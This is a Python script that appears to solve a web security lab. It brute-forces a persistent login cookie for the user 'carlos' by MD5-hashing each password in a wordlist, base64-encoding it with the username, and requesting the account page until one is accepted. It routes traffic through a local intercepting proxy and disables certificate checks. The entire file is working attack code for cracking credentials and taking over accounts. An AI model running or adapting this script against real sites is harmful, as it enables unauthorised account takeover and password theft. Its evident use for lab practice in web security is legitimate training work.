import requests
import sys
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def cookies_bruteforcing(url, session, password_wordlist="/home/kali/passwords.txt"):
    print(["[*] Checking for a valid password by brute-forcing the logged-in cookie ...."])
    username = "carlos"
    my_account_url = url + "/my-account"
    data = {"id": "carlos"}
    found = False
    for password in open(password_wordlist):
        og_password = password.strip()
        print(f"[*] Checking password : {og_password} ...")
        password = password.strip()
        password = password.encode()
        password = hashlib.md5(password).hexdigest()
        creds = f"carlos:{password}"
        creds = creds.encode("ascii")
        creds = base64.b64encode(creds)
        cookie = creds.decode("ascii")
        response = session.get(url=my_account_url, data=data, verify=False, cookies={"stay-logged-in": cookie},
                               proxies=proxies, allow_redirects=False)
        if response.status_code == 200:
            print(f"[*] A valid password was found -> {og_password}")
            print(f"[*] The valid cookie -> {cookie}")
            found = True
            break

    if found:
        print("[*] Exploit successful")

    else:
        print("[*] No valid password was found within the given wordlist")
        print("[*] Exploit Failed :((")
        sys.exit(-1)


def main():
    if len(sys.argv) < 2 and len(sys.argv) > 3:
        print("[*] Wrong tool Usage!")
        print(f"[*] Usage {sys.argv[0]} <url>  <password wordlist>")
        print(f"[*] Example {sys.argv[0]} https://example.com  passwords.txt")
        sys.exit(-1)
    else:
        session = requests.Session()
        if len(sys.argv) == 2:
            cookies_bruteforcing(sys.argv[1], session)
        else:
            cookies_bruteforcing(sys.argv[1], session, sys.argv[2])


if __name__ == "__main__":
    main()


















